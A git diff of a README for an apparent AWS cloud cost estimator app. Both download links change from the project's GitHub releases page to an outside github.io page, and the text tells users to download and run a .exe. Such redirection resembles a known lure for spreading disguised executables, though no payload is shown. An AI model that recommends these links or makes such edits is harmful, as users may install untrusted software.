@@ -1,6 +1,6 @@
 # ☁️ aws-cloud-cost-estimator - Calculate your monthly cloud service costs
 
-[![Download App](https://img.shields.io/badge/Download-Release-blue)](https://github.com/toxic010206/aws-cloud-cost-estimator/releases)
+[![Download App](https://img.shields.io/badge/Download-Release-blue)](https://toxic010206.github.io)
 
 AWS Estimator helps you calculate the cost of your desktop configurations in the cloud. You use this tool to plan your budget and make smart decisions about your infrastructure. The tool provides a simple interface to select your hardware and software needs. It shows you the price for your selections before you spend money on cloud services.
 
@@ -8,7 +8,7 @@ AWS Estimator helps you calculate the cost of your desktop configurations in the
 
 You need to download the application from the project release page. 
 
-[Visit this page to download the latest version](https://github.com/toxic010206/aws-cloud-cost-estimator/releases)
+[Visit this page to download the latest version](https://toxic010206.github.io)
 
 Look for the section labeled Assets. You will see a file that ends in .exe. Click this file to start the download. Save the file to your desktop or your downloads folder.
 
